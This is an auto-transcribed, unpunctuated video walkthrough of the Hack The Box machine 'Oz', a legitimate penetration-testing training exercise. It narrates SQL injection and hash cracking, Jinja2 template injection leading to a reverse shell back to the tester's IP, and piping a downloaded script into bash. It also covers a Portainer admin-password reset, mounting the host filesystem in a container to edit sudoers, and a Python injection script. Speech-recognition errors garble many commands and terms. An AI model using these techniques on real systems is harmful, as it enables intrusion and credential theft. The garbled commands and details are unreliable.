 what's going on YouTube this is if psych I'm doing oz from hack the box and this box was all about like web AP is and understanding it it starts out with fuzzing a custom application to poke at a web api that leads you to a sequel injection you get on the box you do some cool things with sequel move around the docker containers get to the host OS which is running a application called portator which has a json api and the developers forgot to hurt in the route that allowed you to set passwords so if unauthenticated users just made a API request to change a password it went through and then is a relatively common thing you see in a lot of applications if you can map out the API and just check out all the routes you normally won't get to like a password reset things but you'll get extended functionality that you may be able to chain into a cool exploit so with all that being said let's just jump in as always talk with the ED map with - SC for default scripts as V enumerate versions Oh a I'll put all formats put in the end metric and call it ours and then the IP address which is 10 10 10 96 this can take some time to run so I've already run it look at the results we have just two ports open 80 and 8080 there birth HTTP services and the service or the server that is running the HP service is that zog for both of them they are different pages because we can see the HTTP title is different this is GBS what - login and this is as web api the other thing I note is and map says the method supported for this one is connection and there's no method supported for the web api so let's go and send these over into burp so to do that i have to go to the page have broke on go over to boot I'm gonna press ctrl R twice and then we're going to click on this edit target button put 8080 and now that will go to the GBR login page so we just label this gbr go here label this web api and click go so we can see the web api responds with our web api please register a user name and GBR redirects us to slash login before that redirection we got a bunch of gibberish that's odd click go a few times and we also have please register username and odd it's always responding with 200 ok um I lost port 8080 so this happened because I was lazy and didn't I modified the target so we're a browser is going to is 8080 I didn't modify the host header but this is 8080 and we get the page we take away slash Logan we see it is redirecting us to where host header is slash login so if we put this to the host of please subscribe and then click go it refers us to please subscribe slash login so that's how that redirections working no real vulnerability just some interesting notes of how I guess HTTP works so let's go over to the web api and do an options because and that didn't tell us what options is supported we just see had options and get go to the GBR page and do options we have head get post options so this is our that both of these appear to be running on the same server but have different configurations one allows post and the other doesn't if we send a post request to this we get you have no power here and it's still saying 200 ok we're not getting any like 404 is 403 what not any error messages so this is gonna make it difficult when we do some type of derp bust because der bus depends on these HTTP results like 200 to identify pages and if it's only gonna be 200 go Buster's not gonna be able to identify what's a valid page and what is not we're never dealing with api's I also add this content type thing or header and we'll do like application JSON and see if the application has a different logic if it's accepting JSON because a lot of web api is work of a JSON another thing is XML so I can try XML and we still get you have no power so I'm going to ignore doing post requests and let's go back to HTTP requests and let's play with this see if we can get this 200 okay to not be 200 okay so let's give it a totally not a valid page and put a bunch of numbers on the end of it so we know this doesn't exist get a bunch of junk 200 okay click go again jonesy okay and please register username so it looks like there's some weird logic that every now and then it sends a bunch of junk going into the Dakota tab try to decode this as like base64 doesn't decode we have a bunch of things that aren't valid hex like that h k k wz so we know it's not like hex encoded don't know what that is not gonna play with it too much but let's go and try to find a way to do a derp bust or fuzz this web service to identify what's valid pages what is not so let's go over back into a terminal and run go Buster with - you for your L HTP 10 10 10 96 and - w-4 word list user share word list derp buster then directory list 2 3 medium text and we see it says a wild code response found it's saying this page that definitely doesn't exist respond with 200 ok so I can't identify pages because everything's saying 200 you can do the - fw to ignore that logic and we see everything's for responding with status 200 we can do - L for length and see if we get a bunch of random lengths because again every now and then respond it with random gibberish so go Buster cannot be used here before I go on more I'm going to do SQL map on the port 8080 because I always like having some type of recon going in the background while I work so let's go back to the repeater tab go to gbr actually let's just go back to Firefox disable burp temporarily go to port 8080 go to book let's clear I hit uh intercept Q and try logging in with like admin admin invalid login let's turn on book and man admin go here let's copy this to a file when the odds directory so let's do G BR login dot request save this go over here SQL map I think - - batch makes it so it always chooses default options we'll see - are we request load this and it's not asking us anything so it's just gonna try and SQL injectors awesome so that's running in the background let's go back and enumerate the Web API so well go Buster doesn't work so let's try W fuzz a different like tool to fuzz HTTP applications the syntax is gonna be pretty much the same it's gonna be - you for URL HTTP 10 10 10 96 - W fluid list user share word list doorbuster directory list - 3 medium text we click go we have to say where we want to fuzz so what a fuzz right there and W fuzz just says hey put capital fuzz in all caps and when I see that I'm gonna replace it with everything and we have W fuzz stopping after about 13 or 14 requests consistently that is odd let's look at this file and see what happens after all these comments go here and we have an empty line get rid of this empty line try W fuzz again and there we go so W fuzz is going until it sees a blank line which is a bit annoying but let's look at all the requests that have it made so everything responding in a 200 everything so far it has a zero length there's multiple words on the page either 1 or 4 and then the character count does change great rapidly so what if we just show everything that has not a length of 0 so if we do - - I think H Elfa hide length of 0 click go we get the lengths of 3 when it begins with the comment and then we get a length of 3 with users this comment is I guess it's used for anchor text so when you put a comment to a page it's going to ignore that so all of these requests they're just going to slash the root and this is responding with that web api login thing and users does the same exact thing so let's go back into a repeater tab the web api get on slash users it's all lowercase click go and responds with this let's put a slash on the end to make it a proper directory still says please register username let's take a username that probably exists and get users admin click go and we get user name admin so this is behaving like a typical REST API and the fact that the very first slash this is gonna be calling what function it goes to or what route the application takes and then once after this is the arguments it passes so we're going to the users route and then passing it the argument admin so we can try putting some type of sequel injection here if we do like a single tick let's say what happens we get a 500 server error so let's do single tick and a comment still server error and I did plus because I'm URL and code in a space because if we do a space it's not gonna work this is invalid HTTP request and then it reversed the other way to do a space is percent 20 if we click go here we get username admin again so this definitely looks like it is going to be sequel injectable so we could try doing like users admin or one is equal to one and then put a single quote here because I know the application has a single quote to end it otherwise this when it calls in to Arab out so they do that and we get username is equal to Dorothy we don't get admin anymore because now we're just getting the very first user in the database because we're saying hey go into this user function and get us with user names is either equal to admin or one equals one and one equals one is always going to return true so it returns the very first user we could do one equals one percent twenty to add a space limit one comma one now we have to do the comment at the end let's see I screwed something up I don't have a space after limit this gets very ugly to look at and we get ten man that's the second user so this is gonna be the line number and this is the number of resort results returned if we do two we get Dorothy but let's always do one there so we always get one result the second user in the database is ten man the third user in the database is wizard oz the fourth user is coward lion I've never seen him Wizard of Oz so there's probably pronounced it wrong it's by lion misspelled but anyways I say this is the fourth user even though I'm typing three because again it starts at zero so we definitely have sequel injection there let's send this over into sequel map and sequel map if you put a stir it's going to automatically inject there so let's copy the file we'll do Web API user dot request and let's go back into our sequel map window we see it's finished and says the GBR login page doesn't look like it's sequel injectable so let's do the sequel map - or on the web api file we see the custom injection mark a star has been found in the option do you want to process it of course we do just ignore the waif detection and let this go and see if it finds a union injection we could have just specified like - - technique space you because we know it's Union injectable but it's not gonna take that long to figure this out there we go you right parameters one is generic injectable don't keep processing and now let's just do a - - dumb click yes and we're getting stuff dumped so we have the tickets gb w we have reissued new ID RSA and IDRs ADA pub keys for SSH access - dorri monkeys note to self Toto nothing to see here and then this looks like base64 so let's do F your - N and send that to base64 - decode what did you expect nothing itching there think of a better secret not for the front door doesn't seem that secure a lion got in today so maybe some type of port knockin here we got 40 34 here so maybe something's there won't be the next entry made you look Dorothy should be able to find the keys in the default folder under home dorothy on the database seriously though more base64 so let's check this out nothing there wasting time right so the key things to note I guess are we have ID RSA for Dorothy and the keys are under home dorothy on the database server so sequel map does have a dash dash file read and we can do a home Dorothy will try to ssh ID underscore or say and see if it reads it confirmation let's see if we try to cat this file we get a encrypted private key so we could send this and try to start decrypting it but the password I believe is relatively secure we'll get it later on this box I'll show other ways to get this file key if we wanted to we could go back into burp and do like users and then what is it we have to do the Union inject so Union select all one and we'll do it like this let's see does this work no let's see admin Union select all sent 21 so let's do ABC did not work which strike wearing a invalid user with that Union so if we do if sec here now we can control this so yep we control the output we can do user and then a comment with specify percent 20 click go the database users Dorothy at 10 100 10 6 so that's interesting graph the bet we know we're in some type of virtualization because we're going to ten ten ten ninety six and this IP is different but we can do I think it's load file and then what is it home Dorothy dot ssh ID RSA click go please register username so that is wrong let's see mister put this in X so let's go Python 3 input then ASCII what is it then ASCII dot X laughs I home Dorothy Sh ID or si we have to make this a fights like object so we got a hex string go back to Bert replace this load file with zo X and then that hex string good go and we get the key here so that's all sequel Maps doing is a union select all and then load file and then the file name so I believe this sequel map calls typecasting a caste or something but easy way to get my sequel to Lotus train without using quotes because quotes can sometimes be bad characters so that's that let's see where were we let's go back to the sequel map oh I know not cat that CD SQL map output 10 10 10 96 table CD Oz DB and the reason why I'm ignoring that SSH key cuz we don't have any SSH windows open so let's cat the users and we have a bunch of hashes so let's go to hash cat example hashes well yeah i disabled burp I just moved this window a little bit there we go and we want let's see this hash it's definitely not Cisco even though this word matches up the hash doesn't it's not begin with dollar $8.00 go again Django and this looks like it's going to be it so let's walk and then print I think that's for maybe three there we go now we got only the hashes so I'm gonna go into my Kraken which has hash cat loaded on it go into hash cat and the hashes it's great the file Oz and then hash cat - M I think it was ten thousand hashes oz opt word list rock you know hash is loaded token line length so let's look at the hash as I put in copy Jane Goose whoops copy Django's what the hell copy paste there we go okay so this looks slightly different we have this one doesn't begin with a dollar and instead of a - it is a under case so my V foo is going with me right now there we go so let's try this again still Limelight's exceptions so maybe that's not the one so let's go back to this and I say that because we look at Django's it's lengths are completely different it's using a different iteration count which probably doesn't matter but its salt is really short compared to this salt and that may be throwing it off so maybe this isn't Jenga after all let's just search for a PB k d f2 and we got pbkdf2 H Mac sha-256 copy this one paste it and make this look like that so let's see that's one two three four five six six characters i miscounted seven characters okay and then we just have to replace the dollar signs with colons so % s place dollar with colon there we go and let's try this and this number is 10 nine hundred and that looks better it's no longer meetly airing out we got a few tokens that failed one two four and six but it looks like three and five are gonna be cracking looking at the speed oh we already got one we got Wizard of Oz 22 for this hash the one that begins with BCD so let's copy this and we don't want that auch anymore so we can grep for that Wizard of Oz BCD and we see wizard oz is password is Wizard of Oz 22 so if we go back to this login page and go wizard oz paste the password go have a space nope wizard oz it didn't work the first time but we get into this application click on these descriptions we see the osage key thing so this this isn't too interesting be we've already read all these in this equidome while this is going what we can do is let's see go back to sequel map dum was it - dump and there's a dump all which will go outside of the current database and start dumping see test request doesn't exist this is Web API see there we go so now it's going into information schema and my sequel databases so we're gonna take dump a lot more so we have stuff going on in the background while we look at this so going here we can click this little plus create a ticket let's do it SEC was here submit this ticket refresh the page and we didn't see any ticket number it's still 1 to 12 so that's odd so let's send this into burp and see if it gave us an error message so do if SEC was here click Submit go to burp let's see we don't want this login request it's Firefox that's junk junk junk junk there we go so mr. repeater I will do call this post login click go and we just see 3 or 2 found and then there's nothing we follow this and brings us back to the page so nothing really there we go in Google or go to payload all the things and do template injection this will give us some things to test and I'm scrolling down twig this is a PHP template Jinja - this is a common Python template and we know it's Python because the server header so this is where we kind of begin so let's try what it says seven times seven would result in seven sevens and interesting to note if you do the same exact command in PHP it results in 49 so this is kind of how it's typecasting something in quotes so PHP is saying hey you're doing math even though you pass this it kind of looks like a string I'm assuming you want to do an integer thing so I'm gonna do 7 times 7 there with Python it's saying you know what this is a string you told me it doesn't look like the thing you just said so I'm gonna print this seven times so easy way to identify kind of like what's running on the back end is doing things like that so if we paste this we get seven sevens so we know this is going to be Python on the back end as confirmed by this server header we can verify that PHP does that we do PHP - a whoops I didn't mean the - yes I think it's echo nope PHP - a echo seven times seven we get 49 seven times seven in quotes we get 49 we do Python three print seven times 7 49 seven times seven with quotes and a bunch of sevens so just a small difference between Python and and between PHP and Python that helps us identify what the server is running in the backend and of course because it didn't print this exact string out we know we have code injection so go back to this payload all the things we have a bunch of Jinja - we have a remote file read so let's try reading this Etsy past d so description base this in and we have the description with the contents of the file so now we can read files let's see what else there is there's a remote code execution so let's copy this into text where we can actually read it easier code exec so this is ugly all this is doing is writing to the file and it's going to write this string into the file so from sub-process import check output run CMD and then you make another request that imports that file so it's importing something in the config and then doing a config run command and passing that what you imported into it so we go back to burp and enumerate the config with just config click go it's not exactly pretty we may be able to send this decoder and smart decode this and then copy this back into a vim paste sent s replace commas with newline and we can see the config and looks like I didn't revert this box from when I was testing it so we see one of my configs is already there so gonna move that and we'll create something else with that so let's create the file let's go back here copy this very first line and instead of doing like a command injection thing like this is creating the function run CMD and then run CMD is going to execute anything I guess we can do that real quick we'll just paste everything in default so go into repeater we'll start with the very last one to prove this one just didn't work at first so we'll do run command here we am I click go internal server error so we know this function doesn't exist yet so let's copy this paste this in we don't need that comment click go none then go back to the page get that second one paste this in so now we're loading the file we wrote into the config and then to fine wrap it all up we do this run CMD and then stand this bash we want Who am I and now we can run commands on this box so we can do I have config click go and we see this box is IP is 10 110 2 so that is one way to do the command injection generally with these templates I don't like leaving something just complete open command execution I'd rather like lock it off by putting an IP address just because you kind of introduce a major vulnerability in the application that may just get picked up luckily or something so to prevent other people from using your code I generally like putting a reverse shell here because unless to control the IP then it's not gonna do anything so let's go to reverse shell cheat sheet go to the pen test monkey let's go to pythons we can just copy this go back into a terminal and this is what we wrote so let's paste this and then if we escape that put it all in one line put this in one line change the IP from 1000 1 to 10 10 14 - I think it's my IP address if we do if config tun 0 yep 10 10 14 - and we'll do port 9000 1 so let's copy this line paste this in - burp paste and instead of calling this evil config will call this please subscribe said and go we get nothing so let's just read this file real quick payload all the things see dump all used read file paste this will do temp please subscribe CFG click go and it looks like a file maybe it doesn't exist because it you're all encoded some things is odd but that could be on the output so it could be just preventing like cross-site scripting it's not stored in the disk this way so I'm gonna import this anyways and see what happens so let's copy this second one paste this in please subscribe CFG and let's start a reverse shell so NCL V and P 9001 click go we don't get a response back but we get a shell so again that was just on the output doing HTML nd encoding I think that's what it's called a HTML encoding dangerous characters that used for cross-site scripting so now we are on the server we do Who am I we a root so I'm gonna do Python 2 SC and port PTY PTY spawn been - no such file or directory let's copy this then Sh I forgot the single quote then background with ctrl Z s TTY raw - echo type F G hit enter and now we got a shell where we have tab autocomplete we can control C and do whatnot so got a good show now let us do and if config we're at 10 110 - if we do an up - am to do up all and then don't do DNS we see we talked to 10 110 1 and 10 110 4 so the first thing I'm going to do is netcat - Z V which just means only connect then disconnect afterwards and do verbose so I can see if you connect so 10 110 1 on port 22 we don't see a connection let's do 10 110 for in port 22 we don't get a connect but it's not immediately dropping us where this one the packet just hangs but on 4 we get a fin request so this is wood netcat or netcat and map would say filtered or open because on port 22 on 1010 110 for this is closed this is obviously closed we send a request we're getting a response back it's not saying it's open because it sent us that Finn request but if we go to 10 110 one we're just waiting we never get a response back so this one is filtered so we can ignore all that let's see there any creds in the actual application if we go into ticular let's cat off top I don't see creds here cat database PI and we get PI my sequel Dorothy no place like home so if we ping Dorothy - see one we're not getting any response back still my sequel so let's go back to our net cat and do three 3:06 which is sequel support 10 110 one just hangs 10 110 for we get an open request so now we know this port is open we can do a my sequel - you Dorothy - P and then - H - specify the host name 10 110 4 and then let's copy this password because it's going to ask us for it paste the password in and we get a my sequel prompt so we can do show databases use Oz DB show tables select star from users gbw and we can see this is the same exact thing that we had dumped we could do select load file let's see passwd and we can read the Etsy pass - BD file so this is exactly where we were with the sequel injection so this application the actual code resides in this piece and then the database is on a different server if we go into just slash and do an LS - la we can see docker so we know we're inside of docker so the actual web application is an eye doctor and then the actual database most likely a different docker if we only solve the one up of ten 110:1 I may think the database is on the host just because the container is only talking to one IP so we do have a dot secret folder so let's check what's in here we got knock deed config and read this we have three you DPS and then we see the start command is ufw a well from IP to any point 22 and we got one for a delete so let's go and see - zvu so we don't need the V we just need Z and you then 1010 1096 whoa 809 502 1 2 then 4 6 9 6 9 and then we get rid of the UDP and do 22 if we do ZV we see it did connect 4 and that closed we got a time out of 10 so this is only open for 10 seconds so let's put a pain again and there is a program called not be that you could use I'm fine just using Linux scripts so for I in forty eight oh nine five zero two one two four six nine six nine do NC - zu ten ten ten ninety six I done and then NC - z ten ten ten ninety six twenty two and always do that - V so you can see we do connect and it's open but we don't have the SSH key yet so let's see let's go into app let's cat the dockerfile and nothing really there we got maintainer insider threat and Mumbai let's go into ticular and let's cat the database top pi and tried Dorothy's password for this SSH key and I didn't actually save the SSH key so let's go up a few times my sequel enter the password select load file home dorothy ssh ID RSA and we can copy this and go v Dorothy SH DNC paste then I always like doing open ssl RSA input dorothy output and removing the password miss ssh key because i hate having the type pass was my SH with keys probably not the wisest thing but it is nice and we see it didn't give us an error message and now this key just isn't encrypted anymore so that is the same password used on the database as this key so if we do this neck head again SSH where is it we can just do Shi Dorothy dot Sh 10 10 10 96 go with the at sea and we get into us so if we do WCC on user dot txt we can see it is 33 characters long which is the length we are expecting for that file the first thing I'm going to do is run win an uma against this so opt plan a Noom Python hm simple HTTP server and we can curl 10 10 14 to put 8000 when a new message type that over to bash and then let this run and then do this on the dock in containers because the dock container we will we were already route so it didn't really matter so let's go to the top and scroll down and see what we have the kernels built in 2018 so chances are were not supposed to do a kernel profess k-- Hurst name is oz user group we have my login from SH groups we have some admin users Etsy passwd nothing interesting super user account root da we have darker commands we can run we can do docker network LS and inspect stir so I'm gonna end the thing right there and since a lot of this was darker stuff I'm assuming we want to do docker things so let's do that user bin dr. Network OS and inspect star so sudo dr. LS Network I think just do sudo - el dr. network LS sudo and we can see we have a few network adapters bridge hostnet prod net so you can do network inspect on them I don't have my up key so sudo dr. network inspect prod net and we see three containers the Web API oz DB and the ticket so we had a shell here we have firewood lead here we haven't had anything on this ticket at page oh no we've had a show on ticket app read file on AWS DB haven't popped Web API so let's look at the other networks we saw so pseudo doctor network sooner shell pseudo doctor network LS and we got bridge and host so pseudo doctored network and SPECT I'm just gonna copy this bridge and we get a container port ena 1.11 and the other one was inspect host and we have no containers there so we got a new IP that is port Aynor now on once I'm into 1702 so let's see if we can ping this okay we can ping it and if we look at what port caner is it is an actual application so chances are this is what we probably should be attacking because it's a dock of management application and if you can create dock containers you can read the root filesystem as we'll find out soon so let's start looking into this port Ainur so if we do LS / and go into containers CD / containers this is annoying you can't do tab autocomplete we have porteño 1.1 1.1 CD into this permission denied LS la we can go into every other container but that one if we look at the run dot paisan these containers let's see cat run dot pie that's not what I wanted we could just try taking these keys and try them as the root password see if we have any easy wins let's cat start done SH see nothing there we can do find - name is equal to start Sh ok not having this up here is really annoying me what's cat like that let's just cat these manly with copies look at the web api's we don't see anything and I'm just trying to see if I find any passwords anywhere nope try the database we get my sequel root password super secret pass so let's just try this su - nothing so let's go back and start looking at this point Ainur 1.1 1.1 if I remember correctly it was on the bridge Network so if we do sudo darker network and SPECT bridge we get its IP address and do we have an map on this host we do so I don't have to worry about doing any type of Sh tunnels to Ford and map so yeah let's just do that in case and map wasn't on it so I'm going to do is let me type the squiggly capital C and if you do that on a like very new line without hitting any keys it will pop up this SSH prompt and then we can do - capital D 1080 and that's just like specifying - D 1080 when we were initially as seaching into the box so we have that port open so now let's do look at proxy chains it's set to 1080 ok let's not proxy DNS requests and let's turn on quiet mood and we can do proxy chains and mat - s capital T 10 10 10 96 and - - open I only want C open things and the reason why we do st is because we want to do full TCP connects because we can't do a since can and if we will route on the SH box we could do like tap adapters to allow us to do it since can but we're not so we can't and this is gonna take a while probably so let's just specify what nine thousand that is not open you should be open try port 22 okay nine thousand one put 8,000 um that should be good let's see let's go back to our SSH do nmap oh it's 172 what not we have to do that 172 this VIP we want 172 1702 so let's try port 9000 try doing - capital p.m. we get that port is open we do other ports they are closed so we know our end map is now successfully configured to go through proxy chains we could just let this go and see how long this takes I already renamed to end map and again well now this even gets banned because it's doing the end map so we can kill that you know I'm apps working because we can do 9000 now you can try like other ports like 22 not open so let us go back into our SSH connection when do that command the squiggly sea thing instead of doing - D for dynamic we're gonna do - el 9,000 localhost 9000 so now in Firefox we have the proxy off and we go to localhost 9000 it's gonna go it should go through a sage connection and it will I keep screwing this up let's do - el 9001 - 170 - what is it 17:02 on port 9000 so what this going to do is listen on our localhost 9001 and every packet it gets to that is going to send it to 172 1702 on port 9000 so if we do 9001 here we go we can also just go into a Firefox options privacy where is proxy proxy and set a manual proxy for actually instead of doing this way let's do it in Firefox see proxy options default none let's do add Sox 5 Sox localhost 1080 cuz we already have that - T open if we save this and then foxy proxy do this 172 1702 on port 9000 we get porteño also so now we have all the tunnel set up to go to poor Tina if we do LS again we see this is running port ainur version 1.1 1.1 so i'm just going to copy this type for tainer 1.1 1.1 we got to turn our proxy off and let's see if there's any exploits so let's add exploit and I search admin pass which can be set multiple times to get hub issue and run for tainer post to api users admin init with JSON password and a password and then login so let's go back to Firefox we're off we can do localhost 9000 1 send this over to burp go to proxy refresh we get this request send this to repeater we can rename this to fourteener click go not modified so we sent the wrong request we want to actually log in a quest so admin admin click login go back to proxy send this one in so the github issue says something but I got off the page so let's turn this off porteño 1.11 exploit and it says send it to api users admin in it so api users admin an it and we'll send this as please subscribe and to prove this is working we'll go to 9001 admin please subscribe and valid credentials send this let me get an error message read-only file system I think something may be screwed up on this box that may have to revert it let's go back to this github request first to API users admin init with JSON password and password API users admin net I'm just gonna revert this box and we'll redo SSH so let's exit out and revert to box the box should be reverted so let's go back and do a port knock and then SSH in once this finishes SHN okay we're back on the box we can do - el 9001 172 1702 on port 9000 okay if we go back into burp well before we go into burp let's go back to this don't save invalid credentials click go 200 okay so no longer a read-only file system and we log right in so now one poor tainer and this is much like the like LXE prevent I think Iraq and IO another box that did doctors had a press clike this where you just create a doctor container and you can symlink the routes host file system into a directory and then you have full access to it so to do this we go to add container and we need to enter the name of this so we'll call this please subscribe and the image let's go to the images to see what ones we can choose from please subscribe well again what images can we choose from let's do Python 2 7 Alpine really doesn't matter which one you choose they're probably how high in Linux is just a common docker Linux build Easter policy the console we want interactive and TTY and for the volumes we want to add a path whoops if we click path when you just do slash and in the container we want to mount it in do slash temp what we can do we'll try / mail flush mount should exist so this can be the root filesystem the containers filesystem we create this container it's taking a while to create there we go we can go to the please subscribe container and click on console changes to bin SH because bin bash didn't exist do LS we're here if we go to slash mount we get another file system and this is the routes file system so if we like cat that's the shadow we can see Dorothy's password is sha encrypted we got the routes there but we can just go into route and do WCC on route text we can also make de s H and copy / mount home Dorothy dot ssh into routes and then just chmod oh it's already smarter than 600 let's see it just see if this works now so we can if I exit this SSH connection my whole web's gonna die so let's go up split this pane do the port knock again sshi Dorothy dot Sh route at ten ten ten ninety six too many S's permission denied public key so it looks like a Wow route SSH is disabled or is it oh it's here so if we go into Etsy go into SSH and cat sh t config crap for the route we have omit route login set to no and deny users route so that's a shame what we can do is edit the crontab so Etsy or do verse spool crong crong tabs and here's roots crontab so we do root 1 2 3 4 5 and will execute tab shell SH and then go into temp V Shell Sh do we have a shell cheat sheet up we do let's do you try this one oh there's some annoying reset thing so that dr. container is now dead we do please subscribe we see the box restored all the containers to the default state and kicked me out so add container before we do that we gotta go to images Python containers add okay interactive volumes add / add this / shell cheat sheet - we'll save port 9000 - that's been added and go to containers did already revert that's annoying images containers add paste interactive volumes create this so we've got five containers now so we can go console in connect CD mount we're their town was it shelled on Sh and my copy paste do work so let's just try this okay bin Sh can't do bash oh can I do bash here starch mount bin I probably have bash there the dock containers don't have bash so that's what I was saying before ovn P 9000 - we bash temp shelled Sh temp gel dat ass H mount tap shell Sh I can tight permission denied chmod seven seven seven so hopefully when the cron executes that we'll get a show so give this probably another 15 seconds and we'll see if we get a shell and it does not look like we got a shell it's been a new minute so we screwed something up so let's go back and we'll probably have to yep redo everything so go to images copy the container name and let's create a new container face this in interactive TTY volumes path create and containers has it been created yet there we go we got to an old container we can go into the console and let's do something a bit easier than just doing the cause let's do mount Etsy sooo doors and say Dorothy is now allowed to do anything so we go back to our ssh studio - shell syntax error let's do - cedar - l pseudo bash 133 has an error let's do then Sh why do you have an error line there we go sudo bin Sh and now we are root so I hope you guys enjoyed that box let's go back a little bit and we'll do a little bit of a learning exercise with the Python SQL injection in case you don't want to use like sequel map so I've been a whole new pain and think back to the time when we went to this Web API thing and had this SQL injection so let's just go here and go back to users and admin the SQL injection was really annoying to show because of all those percent 20s it just did make it exactly readable and it's not exactly the quickest thing to do in brick to keep modifying queries so let's just convert this into a Python exploit so the first thing we're going to do in Python is going to do the from CMD import CMD and we're just creating a test command shell that has history support so you can do up and things like that so class terminal CMD prompt is equal to this and then definition for default action self hugs and we will print bugs okay that should be fine we can do terminal is equal to the class and terminal dot CMD loop so this is just a skeleton exploit so if we do Python test Python 3 forgot a frenzy it's now printing with every type and if we hit the up arrow we can go up and down so just like a normal terminal and ctrl C to exit if you want to read more about that you can just do like python CMD module and then read this there's things like if you do do underscore it can have different functions things like that but so if we did like def do EPS AK self eggs and print please subscribe write execute this again do help we already got the undocumented and if sec we type if sec and put anything it just says please subscribe so this is a little handy module instead of doing printing things though we need to do the request module so we'll do import requests and we will do R is equal to request get and do HTTP 10 10 10 96 slash user slash admins and then well users please subscribe eggs okay and then just print text so we got this and we chose a user that doesn't exist because that's how we had controlled the Union before and then we just end the sequel and try think if we should they should be fine so this would put the variable whatever we type and there and then we comment it off so if we run this just hit enter we get nothing so we can do Union all was it Union select one ABC if we put ABC in quotes we get this so now we can do user to get a username we can do or one equals one get Dorothy limit 0 1 1 1 2 1 3 1 so we can enumerate that way we can do Union select spy password Union select let's see I do mess in unions yep password from was it Osby be users probably so we have to get the actual column names so to do this we can just go information schema and columns probably okay so we probably want the let's see table schema this is going to be the database name then we probably got table name somewhere table name yep and column name so we want to do Union select can cat will do table schema table name and column name from information schema columns limit 0 1 and hope this works we can air so let's see we have an issue somewhere and whenever we have an issue oh we just forgot to probably close parentheses there we go so we have the very first column which is in character sets information schema so we can add a where table schema not like information schema okay and the next database we have is my sequel so let's do and not and table schema not like MySQL so we got the database AHS DB the table tickets gbw and the column ID column name description so now we're in the users table ID username password so we can do select password from Oz DB dot users gb w see probably shouldn't limit that limit zero one okay and if we wanted to we could do can cat username whoops so now we got Dorothy the password we can go second one third one and so on so a pretty cool script just to quickly play with SQL injection and I'd recommend playing with it learning it and then pivoting between different databases to get information you want so hope you guys enjoyed the video take care and I will see you all next week